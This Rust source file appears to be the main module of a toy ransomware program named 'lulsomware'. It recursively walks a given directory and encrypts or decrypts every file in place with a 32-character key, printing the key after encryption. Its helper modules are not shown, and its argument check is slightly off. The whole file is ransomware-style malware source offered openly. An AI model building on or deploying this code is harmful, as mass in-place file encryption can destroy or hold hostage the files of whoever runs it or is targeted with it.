use std::env;
use std::fmt::{Display, Formatter, Result};
use std::fs;
use std::fs::OpenOptions;
use std::process::exit;

mod key_utils;
mod encryption;

enum Action {
    Encrypt,
    Decrypt,
}

impl Display for Action {
    fn fmt(&self, f: &mut Formatter) -> Result {
        match *self {
            Action::Encrypt => write!(f, "Encrypt"),
            Action::Decrypt => write!(f, "Decrypt"),
        }
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        exit_with_help();
    }

    let action = args[1].as_str();
    let working_directory = args[2].as_str();

    match action {
        "encrypt" => {
            let encryption_key = key_utils::set_encryption_key(&args);
            if encryption_key.len() != 32 {
                eprintln!("Please provide a valid 32-long char-utf8 as a custom key");
                exit_with_help();
            }
            perform_action_on_directory(&encryption_key, &Action::Encrypt, working_directory);
            println!("\n\n🔑 {}", encryption_key);
        }
        "decrypt" => {
            let encryption_key = key_utils::set_encryption_key(&args);
            perform_action_on_directory(&encryption_key, &Action::Decrypt, working_directory);
            println!("Done decrypting chief");
        }
        _ => exit_with_help(),
    }
}

fn perform_action_on_directory(encryption_key: &String, action: &Action, working_directory: &str) {
    let directory_entries = fs::read_dir(working_directory).expect(working_directory);

    println!("Command: {} {}", action, working_directory);
    for entry in directory_entries {
        let dir_entry = entry.unwrap();

        if dir_entry.file_type().unwrap().is_dir() {
            perform_action_on_directory(
                encryption_key,
                action,
                dir_entry.path().as_os_str().to_str().unwrap(),
            );
        } else {
            let mut file = OpenOptions::new().read(true).write(true).open(dir_entry.path().as_os_str()).unwrap();
            println!("{}::{}...", action, dir_entry.file_name().into_string().unwrap());

            match action {
                Action::Encrypt => encryption::encrypt_file(&mut file, &encryption_key),
                Action::Decrypt => encryption::decrypt_file(&mut file, &encryption_key),
            }

            println!("{}::{} OK", action, dir_entry.file_name().into_string().unwrap());
        }
    }
}

fn exit_with_help() {
    eprintln!("Encrypt: lulsomware.exe encrypt [directory]");
    eprintln!("Decrypt: lulsomware.exe decrypt [directory] [key]");
    exit(1);
}
